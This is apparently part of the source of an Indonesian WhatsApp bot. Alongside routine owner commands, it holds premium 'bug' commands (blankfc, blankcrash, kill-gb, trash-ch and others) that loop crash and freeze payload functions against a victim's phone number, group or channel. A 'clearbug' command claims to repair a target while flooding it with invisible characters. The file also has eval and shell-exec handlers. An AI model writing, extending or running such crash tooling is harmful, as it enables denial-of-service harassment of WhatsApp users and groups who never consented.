//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delcase": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply(`✏️ Contoh: ${prefix + command} halo`)
    
    const fs = require("fs")
    const path = require("path")
    const filePath = path.join(__dirname, "AlwaysZakzzDev.js")
    
    const namaCase = text.trim()
    const regexCase = new RegExp(`case\\s+"${namaCase}":\\s*\\{[\\s\\S]*?break\\s*`, "g")

    fs.readFile(filePath, "utf8", (err, data) => {
        if (err) {
            console.error("❌ Gagal membaca file:", err)
            return m.reply("🚫 Gagal membaca file utama.")
        }

        if (!regexCase.test(data)) return m.reply(`❌ Case "${namaCase}" tidak ditemukan.`)

        const dataBaru = data.replace(regexCase, "")
        
        fs.writeFile(filePath, dataBaru, "utf8", (err) => {
            if (err) {
                console.error("❌ Gagal menulis file:", err)
                return m.reply("🚫 Terjadi kesalahan saat menghapus case.")
            }

            console.log(`✅ Case "${namaCase}" berhasil dihapus.`)
            return m.reply(`✅ Case "${namaCase}" berhasil dihapus dari AlwaysZakzzDev.js!`)
        })
    })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "editcase": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text || !text.includes("|")) return m.reply(`✏️ Contoh:\n${prefix + command} jpmch|asu`);

    const [oldName, newName] = text.split("|").map(x => x.trim());
    if (!oldName || !newName) return m.reply("❌ Format salah. Gunakan `.editcase jpmch|asu`");

    const fs = require("fs");
    const path = require("path");
    const filePath = path.join(__dirname, "AlwaysZakzzDev.js");

    fs.readFile(filePath, "utf8", (err, data) => {
        if (err) {
            console.error("❌ Gagal membaca file:", err);
            return m.reply("🚫 Gagal membaca file utama.");
        }

        const regex = new RegExp(`case ['"\`]${oldName}['"\`]:`, "g");
        const ditemukan = data.match(regex);

        if (!ditemukan) {
            return m.reply(`❌ Case "${oldName}" tidak ditemukan di file.`);
        }

        const hasilBaru = data.replace(regex, `case "${newName}":`);

        fs.writeFile(filePath, hasilBaru, "utf8", (err) => {
            if (err) {
                console.error("❌ Gagal menulis file:", err);
                return m.reply("❌ Gagal menyimpan perubahan.");
            }

            console.log(`✅ Case "${oldName}" diganti menjadi "${newName}"`);
            return m.reply(`✅ *Berhasil mengganti case!*\n\n🔄 Dari: "${oldName}"\n✅ Menjadi: "${newName}"`);
        });
    });
}
break

//✦━─━──━─━─【 BUG FC + BLANK 】─━─━──━─━✦//

case 'blankfc': {
    if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return m.reply(`*Contoh Penggunaan: ${prefix + command} 6281234567890*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`🚫 *Nomor tidak boleh dimulai dengan 0!*\n\nGunakan awalan kode negara.\n*Contoh:* ${prefix + command} 6281234567890`);
    }

    const thumbnailProcess = fs.readFileSync('./source/media/Process.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailProcess,
        caption: `╭━━❰ *PROCESSING* ❱━━━⬣
┃
┃ ⏳ ᴛᴀʀɢᴇᴛ : wa.me/${bijipler}
┃ ⚙️ sᴛᴀᴛᴜs : ɪɴᴊᴇᴄᴛɪɴɢ ᴘᴀʏʟᴏᴀᴅ...
┃ 🔄 ᴍᴏᴅᴇ : sᴛᴇᴀʟᴛʜ ɪɴᴠɪsɪʙʟᴇ
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Please wait while we break the matrix...* 🧠💥`,
    }, { quoted: m });

    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 15; i++) {
        await TreatehSql(target);
        await TreatehSql(target);
        await TreatehSql(target);
        await TreatehSql(target);
        await TreaterSql(target);
        await TreaterSql(target);
        await TreaterSql(target);
        await TreaterSql(target);
        await killui(target);
        await killui(target);
        await killui(target);
        await killui(target);
        await ExtremeCrash(target);
        await ExtremeCrash(target);
        await ExtremeCrash(target);
        await ExtremeCrash(target);
    }

    await sleep(1200);

    const thumbnailSuccess = fs.readFileSync('./source/media/Succes.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailSuccess,
        caption: `╭━━❰ *SUCCESS* ❱━━⬣
┃
┃ ✅ ᴛᴀʀɢᴇᴛ : wa.me/${bijipler}
┃ ☠️ ʀᴇsᴘᴏɴsᴇ : ɪɴᴠɪsɪʙʟᴇ ᴘʀᴏᴛᴏᴄᴏʟ ᴄᴏᴍᴘʟᴇᴛᴇ
┃ 🧩 ᴍᴏᴅᴜʟᴇ : x52-bʟɪɴᴋ ᴇxᴇ
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Operation terminated successfully.* 🛰️`,
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'blankfrezee': {
    if (!isPremium && !isCreator) return m.reply(mess.prem);
    if (!q) return m.reply(`*Contoh Penggunaan: ${prefix + command} 6281234567890*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`🚫 *Nomor tidak boleh dimulai dengan 0!*\n\nGunakan awalan kode negara.\n*Contoh:* ${prefix + command} 6281234567890`);
    }

    const thumbnailProcess = fs.readFileSync('./source/media/Process.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailProcess,
        caption: `╭━━❰ *PROCESSING* ❱━━━⬣
┃
┃ ⏳ ᴛᴀʀɢᴇᴛ : wa.me/${bijipler}
┃ ⚙️ sᴛᴀᴛᴜꜱ : ᴛʀᴀɴꜱᴍɪᴛᴛɪɴɢ ɢʜᴏꜱᴛ ʙʟᴀɴᴋ...
┃ 🌀 ᴍᴏᴅᴇ : ɪɴᴠɪꜱɪʙʟᴇ ᴇᴄʜᴏ ʙᴜɢ
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Initiating matrix interference...* 🔮`
    }, { quoted: m });

    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 15; i++) {
        await XProtexBlankChatV3(target);
        await XProtexBlankChatV3(target);
        await XProtexBlankChatV3(target);
        await XProtexBlankChatV3(target);
        await XProtexBlankChatV3(target);
        await ForceInfinite(target);
        await ForceInfinite(target);
        await ForceInfinite(target);
        await ForceInfinite(target);
    }

    await sleep(1200);

    const thumbnailSuccess = fs.readFileSync('./source/media/Succes.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailSuccess,
        caption: `╭━━❰ *SUCCESS* ❱━━⬣
┃
┃ ✅ ᴛᴀʀɢᴇᴛ : wa.me/${bijipler}
┃ ☠️ ʀᴇꜱᴘᴏɴꜱᴇ : ɢʜᴏꜱᴛ ʙʟᴀɴᴋ ᴇᴄʜᴏ ɪɴᴊᴇᴄᴛᴇᴅ
┃ 🧩 ᴍᴏᴅᴜʟᴇ : Zakzz-silent/v3
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Blank stealth protocol complete.* 🛸`
    }, { quoted: m });
}
break

//~~~~~~~~~~ AlwaysZakzz ~~~~~~~~~//

case 'blankcrash': {
    if (!isPremium && !isCreator) return m.reply(mess.prem);
    if (!q) return m.reply(`*Contoh Penggunaan: ${prefix + command} 6281234567890*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`🚫 *Nomor tidak boleh dimulai dengan 0!*\n\nGunakan awalan kode negara.\n*Contoh:* ${prefix + command} 6281234567890`);
    }

    const thumbnailProcess = fs.readFileSync('./source/media/Process.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailProcess,
        caption: `╭━━❰ *PROCESSING* ❱━━━⬣
┃
┃ ⏳ ᴛᴀʀɢᴇᴛ : wa.me/${bijipler}
┃ ⚙️ sᴛᴀᴛᴜꜱ : ᴛʀᴀɴꜱᴍɪᴛᴛɪɴɢ ɢʜᴏꜱᴛ ʙʟᴀɴᴋ...
┃ 🌀 ᴍᴏᴅᴇ : ɪɴᴠɪꜱɪʙʟᴇ ᴇᴄʜᴏ ʙᴜɢ
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Initiating matrix interference...* 🔮`
    }, { quoted: m });

    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 15; i++) {
        await ForceBetaNew(target);
        await ForceBetaNew(target);
        await ForceBetaNew(target);
        await ForceBetaNew(target);
        await ForceBetaNew(target);
        await IosNew(target);
        await IosNew(target);
        await IosNew(target);
        await IosNew(target);
        await IosNew(target);
        await TagWa(target);
        await TagWa(target);
        await TagWa(target);
        await TagWa(target);
    }

    await sleep(1200);

    const thumbnailSuccess = fs.readFileSync('./source/media/Succes.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailSuccess,
        caption: `╭━━❰ *SUCCESS* ❱━━⬣
┃
┃ ✅ ᴛᴀʀɢᴇᴛ : wa.me/${bijipler}
┃ ☠️ ʀᴇꜱᴘᴏɴꜱᴇ : ɢʜᴏꜱᴛ ʙʟᴀɴᴋ ᴇᴄʜᴏ ɪɴᴊᴇᴄᴛᴇᴅ
┃ 🧩 ᴍᴏᴅᴜʟᴇ : Zakzz-silent/v3
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Blank stealth protocol complete.* 🛸`
    }, { quoted: m });
}
break

//✦━─━──━─━─【 BUG GRUP OR CH 】─━─━──━─━✦//

case 'trash-ch': {
    if (!isPremium) return m.reply("Only premium users can use this command.");
    if (!qtext) return m.reply(`Usage:\n .${prefix + command} id ch@newsletter`);

    let jidx = qtext.replace(/[^0-9]/g, "");
    

    let target = `${jidx}@s.whatsapp.net`;

    m.reply("╭━━❰ *SUCCESS* ❱━━⬣┃┃ ✅ ᴛᴀʀɢᴇᴛ : wa.me/${jidx}┃ 💥 ʀᴇꜱᴘᴏɴꜱᴇ : Trash channel exciting┃ 🧪 ᴍᴏᴅᴜʟᴇ : Zakzz-crash/v3┃╰━━━━━━━━━━━━━━━━━━⬣> *Payload delivery complete. System unstable.* ☠️")
 
    //Parameters
    for (let r = 0; r < 15; r++) {
        await crashNewsletter(target)
        await crashNewsletter(target)
        await crashNewsletter(target)
        await crashNewsletter(target)
        await crashNewsletter(target)
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'zakzzcrash-gb': {
    if (!isPremium && !isCreator) return m.reply(mess.prem);
    if (!q) return m.reply(`*Contoh Penggunaan:* ${prefix + command} 120363xxxxxx@g.us`);

    const groupJid = q.trim();

    if (!groupJid.endsWith("@g.us")) {
        return m.reply(`🚫 *Target harus berupa JID Grup!*\n\n*Contoh:* ${prefix + command} 120363xxxxxx@g.us`);
    }

    const thumbnailProcess = fs.readFileSync('./source/media/Process.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailProcess,
        caption: `╭━━❰ *PROCESSING* ❱━━━⬣
┃
┃ ⏳ ɢʀᴏᴜᴘ : ${groupJid}
┃ ⚙️ ꜱᴛᴀᴛᴜꜱ : ᴛʀᴀɴꜱᴍɪᴛᴛɪɴɢ ɪɴᴠɪꜱɪʙʟᴇ ᴘᴀʏʟᴏᴀᴅ...
┃ 🌀 ᴍᴏᴅᴇ : ɢʀᴏᴜᴘ ɢʜᴏꜱᴛ ɪɴᴊᴇᴄᴛ
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Establishing silent echo loop...* 🛠️`
    }, { quoted: m });

    for (let i = 0; i < 15; i++) {
        await VampireGroupInvis(groupJid);
        await VampireGroupInvis(groupJid);
        await VampireGroupInvis(groupJid);
        await VampireBugIns(groupJid);
        await VampireBugIns(groupJid);
        await VampireBugIns(groupJid);
        await GroupCarous(groupJid);
        await GroupCarous(groupJid);
        await GroupCarous(groupJid);
    }

    await sleep(1500);

    const thumbnailSuccess = fs.readFileSync('./source/media/Succes.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailSuccess,
        caption: `╭━━❰ *SUCCESS* ❱━━⬣
┃
┃ ✅ ɢʀᴏᴜᴘ : ${groupJid}
┃ ☠️ ʀᴇꜱᴘᴏɴꜱᴇ : ɪɴᴠɪꜱɪʙʟᴇ + ʙʟᴀɴᴋ ɪɴᴊᴇᴄᴛᴇᴅ
┃ 🧩 ᴍᴏᴅᴜʟᴇ : Zakzz-Ghost/v3
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Mission complete. Echo module disengaged.* ⚡`
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'kill-gb': {
    if (!isPremium && !isCreator) return m.reply(mess.prem);
    if (!q) return m.reply(`*Contoh Penggunaan:* ${prefix + command} 120363xxxxxx@g.us`);

    const groupJid = q.trim();

    if (!groupJid.endsWith("@g.us")) {
        return m.reply(`🚫 *Target harus berupa JID Grup!*\n\n*Contoh:* ${prefix + command} 120363xxxxxx@g.us`);
    }

    const thumbnailProcess = fs.readFileSync('./source/media/Process.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailProcess,
        caption: `╭━━❰ *PROCESSING* ❱━━━⬣
┃
┃ ⏳ ɢʀᴏᴜᴘ : ${groupJid}
┃ ⚙️ ꜱᴛᴀᴛᴜꜱ : ᴛʀᴀɴꜱᴍɪᴛᴛɪɴɢ ɪɴᴠɪꜱɪʙʟᴇ ᴘᴀʏʟᴏᴀᴅ...
┃ 🌀 ᴍᴏᴅᴇ : ɢʀᴏᴜᴘ ɢʜᴏꜱᴛ ɪɴᴊᴇᴄᴛ
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Establishing silent echo loop...* 🛠️`
    }, { quoted: m });

    for (let i = 0; i < 15; i++) {
        await stcGc(groupJid);
        await stcGc(groupJid);
        await stcGc(groupJid);
        await Kontol(groupJid);
        await Kontol(groupJid);
        await Kontol(groupJid);
    }

    await sleep(1200);

    const thumbnailSuccess = fs.readFileSync('./source/media/Succes.jpg');

    await ZakzzDev.sendMessage(m.chat, {
        image: thumbnailSuccess,
        caption: `╭━━❰ *SUCCESS* ❱━━⬣
┃
┃ ✅ ɢʀᴏᴜᴘ : ${groupJid}
┃ ☠️ ʀᴇꜱᴘᴏɴꜱᴇ : ɪɴᴠɪꜱɪʙʟᴇ + ʙʟᴀɴᴋ ɪɴᴊᴇᴄᴛᴇᴅ
┃ 🧩 ᴍᴏᴅᴜʟᴇ : Zakzz-Ghost/v3
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Mission complete. Echo module disengaged.* ⚡`
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'clearbug': {
    if (!isPremium && !isCreator) return m.reply(mess.prem);
    if (!q) return m.reply(`*Contoh Penggunaan:* ${prefix + command} 6281234567890`);

    let target = q.replace(/[^0-9]/g, "");
    if (target.startsWith('0')) {
        return m.reply(`🚫 *Nomor tidak boleh diawali dengan 0!*\n\nGunakan kode negara.\n*Contoh:* ${prefix + command} 6281234567890`);
    }

    const processingImage = fs.readFileSync('./source/media/Process.jpg');
    await ZakzzDev.sendMessage(m.chat, {
        image: processingImage,
        caption: `╭━━❰ *INITIALIZING CLEANUP* ❱━━⬣
┃
┃ 🧹 ᴛᴀʀɢᴇᴛ : wa.me/${target}
┃ 🛠️ ᴍᴏᴅᴜʟᴇ : Pembersihan bug
┃ 🧪 ꜱᴛᴀᴛᴜꜱ : Deploying cleanup sequence...
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *Please wait while we stabilize the target's session.*`
    }, { quoted: m });

    let targetJid = target + "@s.whatsapp.net";

    for (let i = 1; i <= 5; i++) {
        await ZakzzDev.sendMessage(targetJid, { text: `🔧 Recovery Patch #${i} Executed` });
        await sleep(700);
        await ZakzzDev.sendMessage(targetJid, { text: '⁣'.repeat(250) }); // hair space payload
    }

    await sleep(1500);

    const doneImage = fs.readFileSync('./source/media/Succes.jpg');
    await ZakzzDev.sendMessage(m.chat, {
        image: doneImage,
        caption: `╭━━❰ *CLEANUP SUCCESSFUL* ❱━━⬣
┃
┃ ✅ ᴛᴀʀɢᴇᴛ : wa.me/${target}
┃ 🧬 ꜱᴛᴀᴛᴜꜱ : Payload neutralized, session stable
┃ 🔒 ꜱᴀꜰᴇ ᴍᴏᴅᴇ : Activated
┃
╰━━━━━━━━━━━━━━━━━━⬣
> *The bug has been cleared. Target can now access chat safely.*`
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ping": case "uptime": {
  const runtime = (seconds) => {
    seconds = Number(seconds);
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor((seconds % (3600 * 24)) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
  };

  const timestamp = speed();
  const latensi = speed() - timestamp;

  const disk = await checkDiskSpace('/');
  const usedDisk = ((disk.size - disk.free) / 1024 / 1024 / 1024).toFixed(2);
  const totalDisk = (disk.size / 1024 / 1024 / 1024).toFixed(2);
  const percentDisk = ((1 - disk.free / disk.size) * 100).toFixed(2);

  const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
  const usedRam = ((os.totalmem() - os.freemem()) / 1024 / 1024 / 1024).toFixed(2);

  const nodev = process.versions.node;
  const npmVersion = execSync('npm -v').toString().trim();
  const platform = os.platform() + ' (' + os.arch() + ')';
  const osVersion = os.version();
  const kernel = os.release();
  const cpu = os.cpus()[0].model;
  const cpuCore = os.cpus().length;

  let teks = `
╭───〔 🛰️ 𝙇𝘼𝙋𝙊𝙍𝘼𝙉 𝙎𝙀𝙍𝙑𝙀𝙍 〕───╮
│ ☁️ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚        : ${latensi.toFixed(2)} ms
│ 🤖 𝘽𝙤𝙩 𝘼𝙠𝙩𝙞𝙛        : ${runtime(process.uptime())}
│ 💻 𝙑𝙋𝙎 𝙐𝙥𝙩𝙞𝙢𝙚       : ${runtime(os.uptime())}
╰────────────────────╯

╭───〔 🧠 𝙄𝙉𝙁𝙊𝙍𝘼𝙈𝙄 𝙎𝙔𝙎𝙏𝙀𝙈 〕───╮
│ 📦 𝙉𝙤𝙙𝙚𝙅𝙎       : v${nodev}
│ 📚 𝙉𝙋𝙈           : ${npmVersion}
│ 🧬 𝙊𝙎            : ${osVersion}
│ 💽 𝙋𝙡𝙖𝙩𝙛𝙤𝙧𝙢      : ${platform}
│ 🧱 𝙆𝙚𝙧𝙣𝙚𝙡        : ${kernel}
│ 🔧 𝘾𝙋𝙐           : ${cpu} (${cpuCore} Core)
│ 🧠 𝙍𝘼𝙈           : ${usedRam} GB / ${totalRam} GB
│ 💾 𝘿𝙞𝙨𝙠 𝙐𝙨𝙖𝙜𝙚    : ${usedDisk} GB / ${totalDisk} GB (${percentDisk}%)
╰────────────────────╯
  `.trim();

  await m.reply(teks);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "public": {
if (!isCreator) return
ZakzzDev.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await ZakzzDev.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
await ZakzzDev.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `AlwaysZakzz V8`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await ZakzzDev.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await ZakzzDev.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await ZakzzDev.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
ZakzzDev.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
ZakzzDev.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner);
if (!m.quoted && !text) 
return m.reply(example("6285###"));
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (m.mentionedJid && m.mentionedJid.length > 0) {
input = m.mentionedJid[0];
} else {
input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}
const input2 = input.split("@")[0];
if (input2 === global.owner || input === botNumber) {
return m.reply(`Lu G Ush Del Owner Utama Anj`);
}
if (!owners.includes(input)) {
return m.reply(`Nomor ${input2} bukan owner bot!`);
}
owners.splice(owners.indexOf(input), 1);
fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));
m.reply(`Berhasil Menghapus Owner ✅`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner);
if (!m.quoted && !text) 
return m.reply(example("6285###"));
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (m.mentionedJid && m.mentionedJid.length > 0) {
input = m.mentionedJid[0];
} else {
input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}
const input2 = input.split("@")[0];
if (input2 === global.owner || owners.includes(input) || input === botNumber) {
return m.reply(`Nomor ${input2} sudah menjadi owner bot!`);
}
owners.push(input);
fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));
m.reply(`Berhasil menambah Owner ✅`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addmod": {
if (!isCreator) return m.reply(mess.owner);
if (!m.quoted && !text) 
return m.reply(example("6285###"));
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (m.mentionedJid && m.mentionedJid.length > 0) {
input = m.mentionedJid[0];
} else {
input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}
const num = input.split("@")[0];
if (global.mods.includes(num)) {
return m.reply(`✅ @${num} sudah menjadi moderator.`, { mentions: [input] });
}
global.mods.push(num);
saveMods();
m.reply(`✅ @${num} ditambahkan sebagai moderator.`, { mentions: [input] });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delmod": {
if (!isCreator) return m.reply(mess.owner);
if (!m.quoted && !text)
return m.reply(example("6285###"));
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (m.mentionedJid && m.mentionedJid.length > 0) {
input = m.mentionedJid[0];
} else {
input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}
const num = input.split("@")[0];
if (!global.mods.includes(num)) {
return m.reply(`❌ @${num} bukan moderator.`, { mentions: [input] });
}
global.mods = global.mods.filter(x => x !== num);
saveMods();
m.reply(`❌ @${num} dihapus dari moderator.`, { mentions: [input] });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listmod": {
    if (!isCreator) return m.reply(mess.owner);
    if (global.mods.length === 0) return m.reply("🚫 Belum ada moderator.");
    let list = global.mods.map((u, i) => `${i + 1}. @${u}`).join("\n");
    m.reply(`📋 *Moderator Saat Ini:*\n\n${list}`, { mentions: global.mods.map(u => `${u}@s.whatsapp.net`) });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online Bwang✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
ZakzzDev.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});